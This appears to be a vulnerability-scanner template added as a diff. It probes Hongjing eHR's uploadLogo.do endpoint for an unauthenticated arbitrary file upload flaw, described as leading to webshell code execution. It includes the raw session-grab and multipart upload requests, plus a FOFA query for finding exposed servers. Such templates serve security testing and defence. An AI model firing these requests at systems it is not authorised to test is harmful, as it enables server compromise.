@@ -1,0 +1,62 @@
+http:
+    - extractors:
+        - group: 0
+          internal: true
+          name: JSESSIONID
+          part: header
+          regex:
+            - JSESSIONID=([A-Za-z0-9])+
+          type: regex
+      matchers:
+        - part: body
+          type: word
+          words:
+            - document.getElementById("pathvalue").
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        - |
+          POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+          Cookie: {{JSESSIONID}}
+          Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+
+          ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+          Content-Disposition: form-data; name="path"
+
+
+          ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+          Content-Disposition: form-data; name="lfType"
+
+          0
+          ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+          Content-Disposition: form-data; name="logofile"; filename=""
+          Content-Type: image/gif
+
+          1
+          ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+          Content-Disposition: form-data; name="twoFile"; filename=""
+          Content-Type: image/gif
+
+          1
+          ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+id: HJEHR-uploadLogo_do-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: app="HJSOFT-HCM"
+        宏景eHR uploadLogo.do 接口存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。
+    name: 宏景eHR uploadLogo.do 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489336&idx=1&sn=751a6198afda40267aabb99699f930d2&chksm=c267a20bf5102b1dd1b525876f3d881c17a551454fdd3dfb9e27470f219d57326e9aba798518&token=1884652675&lang=zh_CN#rd
+    severity: high
+    tags:
+        - 宏景ehr
+        - HJSoft-HCM
